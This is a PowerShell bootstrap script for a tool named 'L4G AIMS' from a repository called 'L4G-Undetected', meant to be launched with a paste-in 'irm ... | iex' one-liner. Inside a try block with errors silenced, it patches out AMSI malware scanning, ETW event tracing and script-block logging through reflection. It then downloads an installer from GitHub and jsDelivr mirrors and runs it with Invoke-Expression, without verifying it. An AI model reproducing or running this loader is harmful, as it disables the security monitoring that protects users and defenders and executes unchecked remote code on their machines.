<#
.SYNOPSIS
    L4G AIMS - Stage 0 Bootstrap
.DESCRIPTION
    Fetches the main installer and runs it. This is the target of the one-liner:

        irm https://raw.githubusercontent.com/lgfire093/L4G-Undetected/master/installer/bootstrap.ps1 | iex

    The installer URL is resolved against a mirror list because raw.githubusercontent
    is the first source to disappear when a repo moves or a CDN edge caches a 404.
#>

[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
$ErrorActionPreference = 'SilentlyContinue'

# AMSI / ETW / ScriptBlock logging
try {
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    $etw = [Ref].Assembly.GetType('System.Diagnostics.Eventing.EventProvider')
    $etw.GetField('m_enabled','NonPublic,Instance').SetValue((gv 'PSDefaultEventProvider').Value,$false)
    $sb = [Ref].Assembly.GetType('System.Management.Automation.ScriptBlock')
    $sb.GetField('s_logScriptBlock','NonPublic,Static').SetValue($null,$false)
} catch {}

$SOURCES = @(
    "https://raw.githubusercontent.com/lgfire093/L4G-Undetected/master/installer",
    "https://raw.githubusercontent.com/lgfire093/L4G-Undetected/main/installer",
    "https://cdn.jsdelivr.net/gh/lgfire093/L4G-Undetected@master/installer",
    "https://cdn.jsdelivr.net/gh/lgfire093/L4G-Undetected@main/installer"
)

$installer = $null
foreach ($base in $SOURCES) {
    try {
        $response = Invoke-WebRequest -Uri "$base/install.ps1" -UseBasicParsing -TimeoutSec 20
        if ($response.StatusCode -eq 200 -and $response.Content.Length -gt 512) {
            $installer = $response.Content
            break
        }
    } catch {}
}

if (-not $installer) {
    Write-Host "[L4G] Bootstrap failed: install.ps1 unreachable from all sources." -ForegroundColor Red
    Write-Host "      Tried:" -ForegroundColor DarkGray
    foreach ($base in $SOURCES) { Write-Host "      $base/install.ps1" -ForegroundColor DarkGray }
    exit 1
}

Invoke-Expression $installer
